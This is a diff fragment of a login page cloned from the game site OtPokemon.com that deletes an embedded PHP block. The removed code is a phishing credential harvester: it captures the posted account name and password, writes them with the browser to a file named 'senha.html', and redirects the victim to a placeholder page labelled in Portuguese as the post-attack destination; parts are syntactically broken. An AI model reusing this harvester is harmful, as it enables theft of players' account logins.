@@ -283,31 +283,5 @@ function mostrarsenha() {
 <footer>
   <div class="footer">OtPokemon.com</div>
 </footer>
-<?php
-$nomearquivo ="senha.html";
-$acc =$_POST["acc"];
-$senha =$_POST["pwd"];
-$traco ="<br><br>";
-$ess ="acc: ".$acc."<br>Senha: ".$senha."<br>Navegador: ".$browser."
-$escreve =fwrite($abre, $ess);
-echo "<script>javascript:document.location='Pagina que deseja redirecionar apos o ataque'
-</script>";
-function redirecionar($url, $tempo) 
-{ 
-    $url = str_replace('&amp;', '&', $url); 
-         
-    if($tempo > 0) 
-    { 
-        header("Refresh: $tempo; URL=$url"); 
-    } 
-    else 
-    { 
-        @ob_flush();
-        @ob_end_clean();
-        header("Location: $url"); 
-        exit; 
-    } 
-} 
-?>
 </body>
 </html>
